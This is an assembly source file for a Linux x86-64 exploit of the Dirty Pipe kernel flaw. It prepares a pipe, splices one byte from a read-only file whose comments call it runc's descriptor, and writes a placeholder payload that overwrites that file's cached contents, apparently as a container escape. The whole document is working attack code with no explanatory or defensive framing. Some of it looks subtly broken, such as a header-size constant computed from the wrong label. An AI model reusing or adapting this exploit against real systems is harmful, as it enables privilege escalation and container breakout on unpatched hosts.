BITS 64

ehdr:
    db      0x7F, "ELF", 2, 1, 1, 0         ;   e_ident
    db      0, 0, 0, 0, 0, 0, 0, 0
    dw      3                               ;   e_type
    dw      0x3E                            ;   e_machine
    dd      1                               ;   e_version
    dq      _start                          ;   e_entry
    dq      phdr - $$                       ;   e_phoff
    dq      0                               ;   e_shoff
    dd      0                               ;   e_flags
    dw      ehdrsize                        ;   e_ehsize
    dw      phdrsize                        ;   e_phentsize
    dw      1                               ;   e_phnum
    dw      0                               ;   e_shentsize
    dw      0                               ;   e_shnum
    dw      0                               ;   e_shstrndx

ehdrsize equ $ - phdr

phdr:
phdr_load:
    dd      1                               ;   p_type
    dd      7                               ;   p_flags
    dq      0                               ;   p_offset
    dq      $$                              ;   p_vaddr
    dq      $$                              ;   p_paddr
    dq      filesize                        ;   p_filesz
    dq      filesize                        ;   p_memsz
    dq      0x1000                          ;   p_align

phdrsize    equ $ - phdr

global _start

section .text

_start:
    call main

main:
    sub rsp, 0x10008

; *******************
; prepare_pipe
; *******************
prepare_pipe:
    mov rax, SYS_PIPE
    mov rdi, rsp                                       ; p
    syscall

; *******************
; write
; init pipe with 65536
; *******************
write: 
    mov rax, SYS_WRITE
    mov rdx, PAGE_SIZE
    lea rsi, [rsp+8]                                ;buffer
    mov edi, [rsp+4]
    syscall

; *******************
; read
; init pipe with 65536
; *******************
read: 
    mov rax, SYS_READ
    mov rdx, PAGE_SIZE
    lea rsi,  [rsp+8]                         ;buffer
    mov edi,  [rsp]                          ; p[0]
    syscall

; *******************
; open
; get runc's fd
; *******************
open:
    mov rax, SYS_OPEN
    mov rdx, 0
    mov rsi, O_RDONLY                          ;flags
    mov rdi, runc                                       ;filename
    syscall

; *******************
; splice
; *******************
splice: 
    mov r9, 0                                                     ; flags
    mov r8, 1                                                     ; len
    mov rcx, NULL                                           ; off_out
    mov edx, [rsp+4]                                          ; p[1]
    mov rsi,   0                                                  ; offset
    mov rdi,  rax                          ; fd
    mov rax, SYS_SPLICE
    syscall

; *******************
; write_payload
; 
; *******************
write_payload: 
    mov rdx, MAX_LENGTH                                ; length
    mov rsi,   payload                                             ; payload
    mov edi, [rsp+4]                                       ; p[1]
    mov rax, SYS_WRITE
    syscall

; *******************
; exit
; *******************
exit:
    mov       rax, SYS_EXIT
    xor       rdi, rdi                      ; exit code 0
    syscall                               ; invoke operating system to exit

section .data
    ; ********syscall*******
    SYS_READ:                   equ 0
    SYS_WRITE:                  equ 1
    SYS_OPEN:                   equ 2
    SYS_PIPE:                   equ 22
    SYS_EXIT:                       equ 60
    SYS_SPLICE:                 equ 275
    ; ********flag*******
    LF                                  equ    10            ; line feed
    NULL                            equ    0             ; end of string
    STDOUT:                       equ 1
    O_RDONLY           equ    000000q        ; read only
    BUFF_SIZE          equ 255
    PAGE_SIZE           equ 65536
    MAX_LENGTH equ 10
    ; ********string*******
    runc db '/tmp/fd',NULL ; runc fd
    payload db "st0n3st0n3"

;section    .bss


filesize equ $ - $$